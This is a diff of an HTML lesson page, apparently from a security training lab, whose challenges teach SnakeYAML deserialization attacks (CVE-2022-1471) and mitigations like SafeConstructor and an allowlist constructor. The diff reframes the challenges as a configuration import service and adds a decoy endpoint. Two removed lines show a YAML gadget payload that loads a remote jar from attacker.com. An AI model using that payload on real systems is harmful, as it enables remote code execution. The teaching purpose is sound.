@@ -1,30 +1,63 @@
 <!DOCTYPE html>
-
 <html xmlns:th="http://www.thymeleaf.org">
 
-    <link rel="stylesheet" type="text/css" href="http://code.jquery.com/ui/1.9.1/themes/base/jquery-ui.css" />
-	<div class="lesson-page-wrapper">
-        <div class="adoc-content" th:replace="~{doc:lessons/osssnakeyaml/documentation/VulnerableSnakeyamlcomponents_plan.adoc}"></div>
-	</div>
-
-    <!-- Original Content 0 -->
     <div class="lesson-page-wrapper">
-        <div class="adoc-content" th:replace="~{doc:lessons/osssnakeyaml/documentation/VulnerableSnakeYamlComponents_content1.adoc}"></div>
+        <div class="adoc-content" th:replace="~{doc:lessons/osssnakeyaml/documentation/VulnerableSnakeYamlComponents_content0.adoc}"></div>
     </div>
 
-
-    <!-- Challenge 1: Vulnerable Endpoint (CVE-2022-1471) -->
+    <!-- Challenge 1: Full-constructor import -->
     <div class="lesson-page-wrapper">
-        <h3>Challenge 1: Exploit CVE-2022-1471 RCE Vulnerability</h3>
+        <h3>Challenge 1: Configuration Import Service</h3>
+        <p>
+            A configuration management service accepts documents in multiple formats and
+            imports them into the application's runtime configuration store. The service
+            supports several import strategies with different type-handling policies.
+        </p>
+        <p>
+            The primary import endpoint uses a full constructor. Explore what happens when
+            the document body contains type directives beyond standard scalars and mappings.
+        </p>
         <div class="attack-container">
             <div class="assignment-success"><i class="fa fa-2 fa-check hidden" aria-hidden="true"></i></div>
-            <form class="attack-form" accept-charset="UNKNOWN" method="POST" name="form" action="VulnerableSnakeYamlComponents/attack1">
+
+            <form class="attack-form" accept-charset="UNKNOWN" method="POST" name="importForm"
+                  action="config/import">
                 <div id="lessonContent">
-                    <table>
+                    <table style="border-collapse:separate; border-spacing:0 6px;">
                         <tr>
-                            <td>Enter YAML payload to trigger RCE:</td>
-                            <td><textarea name="payload" value="" type="TEXT" rows="12" cols="80" placeholder="!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://attacker.com/evil.jar&quot;]]]]"/></td>
-                            <td><input name="SUBMIT" value="Test Payload" type="SUBMIT"/></td>
+                            <td style="width:140px; vertical-align:top; padding-right:10px;">
+                                <label>Import Format</label>
+                            </td>
+                            <td>
+                                <select name="importFormat" style="width:120px;">
+                                    <option value="yaml" selected>YAML</option>
+                                    <option value="json">JSON</option>
+                                    <option value="csv">CSV</option>
+                                </select>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td style="vertical-align:top; padding-right:10px;">
+                                <label>Target Environment</label>
+                            </td>
+                            <td>
+                                <input name="environment" type="text" value="production"
+                                       style="width:140px;" />
+                            </td>
+                        </tr>
+                        <tr>
+                            <td style="vertical-align:top; padding-right:10px;">
+                                <label>Configuration Body</label>
+                            </td>
+                            <td>
+                                <textarea name="configData" rows="10" cols="72"
+                                          placeholder="Paste configuration document here"></textarea>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td colspan="2" style="padding-top:6px;">
+                                <input name="SUBMIT" value="Import Configuration" type="submit"/>
+                            </td>
                         </tr>
                     </table>
                 </div>
@@ -34,38 +67,45 @@
         </div>
     </div>
 
-<!-- Challenge 2: Vulnerable Endpoint (CVE-2022-1471) -->
+    <!-- Challenge 2: loadAs variant -->
     <div class="lesson-page-wrapper">
-        <h3>Challenge 2: Exploit CVE-2022-1471 RCE Vulnerability with loadas</h3>
+        <h3>Challenge 2: Schema-Validation Import</h3>
+        <p>
+            A second import path uses <code>loadAs</code> to enforce a target type during
+            deserialization. Explore whether type tags in the document body can influence
+            the deserialization outcome on this path.
+        </p>
         <div class="attack-container">
             <div class="assignment-success"><i class="fa fa-2 fa-check hidden" aria-hidden="true"></i></div>
-            <form class="attack-form" accept-charset="UNKNOWN" method="POST" name="form" action="VulnerableSnakeYamlComponents/attack2">
+
+            <form class="attack-form" accept-charset="UNKNOWN" method="POST" name="validateForm"
+                  action="config/validate">
                 <div id="lessonContent">
-                    <table>
+                    <table style="border-collapse:separate; border-spacing:0 6px;">
                         <tr>
-                            <td>Enter YAML payload to trigger RCE:</td>
-                            <td><textarea name="payload" value="" type="TEXT" rows="12" cols="80" placeholder="!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://attacker.com/evil.jar&quot;]]]]"/></td>
-                            <td><input name="SUBMIT" value="Test Payload" type="SUBMIT"/></td>
+                            <td style="width:140px; vertical-align:top; padding-right:10px;">
+                                <label>Import Format</label>
+                            </td>
+                            <td>
+                                <select name="importFormat" style="width:120px;">
+                                    <option value="yaml" selected>YAML</option>
+                                    <option value="json">JSON</option>
+                                </select>
+                            </td>
                         </tr>
-                    </table>
-                </div>
-            </form>
-            <div class="attack-feedback"></div>
-            <div class="attack-output"></div>
-        </div>
-    </div>
- <!-- Challenge 3: SafeConstructor -->
-    <div class="lesson-page-wrapper">
-        <h3>Challenge 2: SafeConstructor Mitigation</h3>
-        <p>Try to exploit this endpoint protected with SafeConstructor.</p>
-        <div class="attack-container">
-            <form class="attack-form" accept-charset="UNKNOWN" method="POST" name="form" action="VulnerableSnakeYamlComponents/SafeConstructor">
-                <div id="lessonContent">
-                    <table>
                         <tr>
-                            <td>YAML payload (SafeConstructor protected):</td>
-                            <td><textarea name="payload" value="" type="TEXT" rows="12" cols="80" placeholder="name: John&#10;age: 30&#10;email: john@example.com"/></td>
-                            <td><input name="SUBMIT" value="Test Against SafeConstructor" type="SUBMIT"/></td>
+                            <td style="vertical-align:top; padding-right:10px;">
+                                <label>Configuration Body</label>
+                            </td>
+                            <td>
+                                <textarea name="configData" rows="10" cols="72"
+                                          placeholder="Paste configuration document here"></textarea>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td colspan="2" style="padding-top:6px;">
+                                <input name="SUBMIT" value="Validate and Import" type="submit"/>
+                            </td>
                         </tr>
                     </table>
                 </div>
@@ -75,18 +115,34 @@
         </div>
     </div>
 
-    <!-- Challenge 4: Whitelist Constructor -->
+    <!-- Challenge 3: SafeConstructor mitigation -->
     <div class="lesson-page-wrapper">
-        <h3>Challenge 3: Whitelist Constructor</h3>
-    	<p>Try to exploit this endpoint protected with SafeConstructor.</p>
+        <h3>Challenge 3: Safe Import (Mitigation A)</h3>
+        <p>
+            This path applies a restrictive constructor that rejects arbitrary type
+            instantiation. Try to achieve the same outcome as in Challenges 1 and 2
+            and observe how this policy changes the behaviour.
+        </p>
         <div class="attack-container">
-            <form class="attack-form" accept-charset="UNKNOWN" method="POST" name="form" action="VulnerableSnakeYamlComponents/RestrictConstructor">
+            <div class="assignment-success"><i class="fa fa-2 fa-check hidden" aria-hidden="true"></i></div>
+
+            <form class="attack-form" accept-charset="UNKNOWN" method="POST" name="safeForm"
+                  action="config/safe-import">
                 <div id="lessonContent">
-                    <table>
+                    <table style="border-collapse:separate; border-spacing:0 6px;">
                         <tr>
-                            <td>YAML payload (SafeConstructor protected):</td>
-                            <td><textarea name="payload" value="" type="TEXT" rows="12" cols="80" placeholder="name: John&#10;age: 30&#10;email: john@example.com"/></td>
-                            <td><input name="SUBMIT" value="Test Against Whitelist" type="SUBMIT"/></td>
+                            <td style="width:140px; vertical-align:top; padding-right:10px;">
+                                <label>Configuration Body</label>
+                            </td>
+                            <td>
+                                <textarea name="configData" rows="8" cols="72"
+                                          placeholder="Try the same document as above"></textarea>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td colspan="2" style="padding-top:6px;">
+                                <input name="SUBMIT" value="Submit to Safe Import" type="submit"/>
+                            </td>
                         </tr>
                     </table>
                 </div>
@@ -96,8 +152,100 @@
         </div>
     </div>
 
-	<div class="lesson-page-wrapper">
-        <div class="adoc-content" th:replace="~{doc:lessons/osssnakeyaml/documentation/VulnerableSnakeyamlcomponents_content6.adoc}"></div>
-	</div>
+    <!-- Challenge 4: Allowlist constructor mitigation -->
+    <div class="lesson-page-wrapper">
+        <h3>Challenge 4: Restricted Import (Mitigation B)</h3>
+        <p>
+            This path uses a type-allowlist constructor that permits only
+            <code>java.util.List</code> and <code>java.util.Map</code>. Try to achieve
+            the same outcome again and observe the difference.
+        </p>
+        <div class="attack-container">
+            <div class="assignment-success"><i class="fa fa-2 fa-check hidden" aria-hidden="true"></i></div>
+
+            <form class="attack-form" accept-charset="UNKNOWN" method="POST" name="restrictedForm"
+                  action="config/restricted-import">
+                <div id="lessonContent">
+                    <table style="border-collapse:separate; border-spacing:0 6px;">
+                        <tr>
+                            <td style="width:140px; vertical-align:top; padding-right:10px;">
+                                <label>Configuration Body</label>
+                            </td>
+                            <td>
+                                <textarea name="configData" rows="8" cols="72"
+                                          placeholder="Try the same document as above"></textarea>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td colspan="2" style="padding-top:6px;">
+                                <input name="SUBMIT" value="Submit to Restricted Import" type="submit"/>
+                            </td>
+                        </tr>
+                    </table>
+                </div>
+            </form>
+            <div class="attack-feedback"></div>
+            <div class="attack-output"></div>
+        </div>
+    </div>
+
+    <!-- Decoy: Preview endpoint -->
+    <div class="lesson-page-wrapper">
+        <h3>Configuration Preview (Dry Run)</h3>
+        <p>
+            Use this endpoint to preview how many top-level keys a document contains
+            before committing an import. The preview path uses a safe parser and does
+            not persist any data.
+        </p>
+        <div class="attack-container">
+            <form class="attack-form" accept-charset="UNKNOWN" method="POST" name="previewForm"
+                  action="config/preview">
+                <div id="lessonContent">
+                    <table style="border-collapse:separate; border-spacing:0 6px;">
+                        <tr>
+                            <td style="width:140px; vertical-align:top; padding-right:10px;">
+                                <label>Import Format</label>
+                            </td>
+                            <td>
+                                <select name="importFormat" style="width:120px;">
+                                    <option value="yaml" selected>YAML</option>
+                                    <option value="json">JSON</option>
+                                </select>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td style="vertical-align:top; padding-right:10px;">
+                                <label>Target Environment</label>
+                            </td>
+                            <td>
+                                <input name="environment" type="text" value="development"
+                                       style="width:140px;" />
+                            </td>
+                        </tr>
+                        <tr>
+                            <td style="vertical-align:top; padding-right:10px;">
+                                <label>Configuration Body</label>
+                            </td>
+                            <td>
+                                <textarea name="configData" rows="6" cols="72"
+                                          placeholder="Paste document to preview"></textarea>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td colspan="2" style="padding-top:6px;">
+                                <input name="SUBMIT" value="Preview" type="submit"/>
+                            </td>
+                        </tr>
+                    </table>
+                </div>
+            </form>
+            <div class="attack-feedback"></div>
+            <div class="attack-output"></div>
+        </div>
+    </div>
+
+    <div class="lesson-page-wrapper">
+        <div class="adoc-content" th:replace="~{doc:lessons/osssnakeyaml/documentation/VulnerableSnakeYamlComponents_content6.adoc}"></div>
+    </div>
 
 </html>
